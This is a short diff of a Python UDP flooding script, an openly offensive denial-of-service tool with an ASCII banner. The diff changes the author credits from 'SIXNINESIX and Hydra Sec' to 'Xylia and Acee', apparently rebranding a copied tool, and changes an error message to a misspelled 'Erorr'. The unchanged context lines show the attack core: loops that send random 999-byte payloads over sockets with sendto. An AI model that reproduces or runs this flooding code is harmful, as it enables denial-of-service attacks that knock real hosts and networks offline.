@@ -1,5 +1,5 @@
 #YANG NYURI YATIM
-#AUTHOR SIXNINESIX
+#AUTHOR Xylia
 import random
 import socket
 import threading
@@ -9,7 +9,7 @@ import sys
 os.system("clear")
 print("""
 \u001b[35m
-AUTHOR TOOLS : SIXNINESIX AND HYDRA SEC
+AUTHOR TOOLS : Xylia and Acee
 
 ██╗░░██╗██╗░░░██╗██████╗░██████╗░░█████╗░  ░██████╗███████╗░█████╗░
 ██║░░██║╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██╔════╝██╔══██╗
@@ -35,7 +35,7 @@ def run():
 				s.sendto(data,addr)
 			print(i +" Sent!!!")
 		except:
-			print("[!] Error!!!")
+			print("[!] Erorr!!!")
 
 def run2():
 	data = random._urandom(999)
